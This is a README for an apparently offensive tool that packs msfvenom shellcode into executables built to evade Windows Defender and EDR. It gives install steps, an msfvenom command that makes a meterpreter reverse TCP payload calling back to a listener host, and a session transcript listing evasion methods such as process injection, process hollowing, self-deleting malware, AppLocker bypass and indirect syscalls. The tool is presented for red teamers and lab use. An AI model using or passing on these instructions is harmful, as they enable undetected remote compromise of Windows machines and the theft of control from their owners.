About mahira muzzi 


**MAhira muzzi** is a powerful tool designed to **bypass Windows Defender's security mechanisms**, enabling seamless execution of payloads on Windows systems without triggering security alerts. It utilizes a combination of **advanced techniques** to manipulate and disguise payloads, providing cybersecurity professionals, red teamers, and penetration testers with a **robust solution** for achieving undetected access.





---


# ✔️ **Installation**

Clone the repository and set up the environment.

### **Option 1: Manual Installation**

after git clone 
do it in the direcotory where you have installed the tool 


# **IMPORTANT**--------------------
dont forget to use pyhtons virtual enviroment or else tool will not run 

MAke virtualpython enviorment 
use these commands  python -m venv myenv      then       source myenv/bin/activate  

after using the tool  use this command "deactivate" to come out of the virtual env 

pip install -r requirements.txt
sudo apt-get update
sudo apt-get install -y mingw-w64
sudo apt install mono-complete
mkdir masm
wget -O masm/uasm_linux64.zip https://www.terraspace.co.uk/uasm257_linux64.zip
unzip masm/uasm_linux64.zip -d masm
chmod +x masm/uasm*
sudo cp masm/uasm /usr/bin/uasm
```

### **Option 2: Scripted Installation (Recommended)**

Also you need to be in virtual enviorment using the commands told in the first option to be able to compile it automatically
If you prefer an automated setup, use the provided script:

```bash
chmod +x install_dependencies.sh
./install_dependencies.sh
```

---

# ⚙️ **Usage**

Make a paylod using msfvenom only make a raw payload nothing else will work

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.130.175 LPORT=443 -f raw > payload.bin

give the name of payload you made with msfvenom when you are prompted while using the tool /

            
                                                                                                                                                                    

                                                                                                                                                                     
                                                                                                                                                                     Functionalites of the tool 


You sure you want to Continue?(Use it ethically, and in lab enviroments only) y/n: y                                                                                 
Enter your payload choice:                                                                                                                                           
1.)self-injection(XOR)                                                                                                                                               
2.)self-injection(AES)                                                                                                                                               
3.)Process Injection(spoolsv)(Can be used for lateral movement)                                                                                                      
4.)Process Hollow                                                                                                                                                    
5.)Self Deleting Malware(HAVE TO WAIT, CLOSE TO A MINUTE FOR THE PAYLOAD TO EXECUTE)                                                                                 
6.)DLL side-load/rundll32 applocker bypass                                                                                                                           
7.)Process Injection(explorer.exe)                                                                                                                                   
8.)Powershell(Will bypass with cloud detections enabled as well)(Make sure to run this payload twice)(use x64 payload only)                                          
9.)Applocker bypass small shellcodes(Make sure to use x86 payloads)(Also make sure to change the .exe file name after everyrun on the same victim)(Make sure you run this payload twice)                                                                                                                                                  
10.)Applocker bypass Havoc/large shellcodes(use x86 payloads only)                                                                                                   
11.)Indirect Syscall(Windows 10)(Possible EDR bypass loader)                                                                                                         
>2                                                                                                                                                                   
Please type in the shellcode file name: payload.bin                                                                                                                  
Selected self-injection(AES)                                                                                                                                         
[*]Payload successfully created as mahira_AES.exe
```

---

## 📄 **Notes**
- Ensure you have **Python 3.8+** installed.
- Run the commands in a terminal with the required permissions.


  
